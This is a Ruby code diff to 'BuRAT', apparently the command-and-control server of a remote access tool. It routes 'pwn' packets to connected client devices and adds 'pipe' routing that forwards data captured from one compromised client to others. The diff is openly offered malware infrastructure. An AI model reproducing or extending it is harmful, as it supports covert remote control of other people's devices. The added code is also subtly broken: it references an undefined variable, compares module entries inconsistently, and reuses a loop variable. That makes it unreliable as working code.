@@ -28,8 +28,7 @@ module BuRAT
             payload = packet['payload']     # payload
             trailer = packet['trailer']     # trailer
 
-            p header
-            #p trailer                       # debug
+            p "#{header} #{trailer}"
 
             if header == "androids" then     # clients - list of clients
               packet = packet("androids", @androids, 'deathnote')
@@ -38,6 +37,7 @@ module BuRAT
               android = @androids.find { |android| android["id"] == payload["id"] }
               payload.store("status", "Online")
               payload.store("ws", ws)
+              payload["inators"].each { |inator| inator.store("pipes", Array.new) }
               android == nil ? @androids << payload : android.replace(payload)
               packet = packet("android", payload, "disconnected")
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
@@ -46,12 +46,30 @@ module BuRAT
               packet = packet("data", payload, trailer)
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
+              android = @androids.find { |android| android["id"] == payload["android"] }
+              inator = android["inators"].find { |inator| inator == payload["inator"] }
+              inator["pipes"].each do |pipe|
+                android = @androids.find { |android| android["id"] == pipe["android"] }
+                payload = {"android" => android, "inator" => pipe["inator"], "data" => data}
+                packet = packet("pwn", payload, trailer)
+                android["ws"].send(packet)
+              end
             elsif header == "pwn" then      # pwn - send to other clients
               packet = packet("pwn", payload, trailer)
               android = @androids.find { |android| android["id"] == payload["android"]}
               android["ws"].send(packet)
-            elsif header == "pipe_open" then
-            elsif header == "pipe_close" then
+            elsif header == "pipe" then
+              android = @androids.find { |android| android["id"] == payload["android_in"] }
+              inator = android["inators"].find { |inator| inator["code"] == payload["inator_in"] }
+              case payload["switch"]
+              when "open"
+                inator["pipes"] << {"android" => payload["android_out"], "inator" => payload["inator_out"]}
+              when "close"
+                inator["pipes"].delete({"android" => payload["android_out"], "inator" => payload["inator_out"]})
+              end
+              packet = packet("android", android, "pipe")
+              masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
+              masters.each { |master| master["ws"].send(packet) }
             end
           rescue
             #ws.send(event.data)
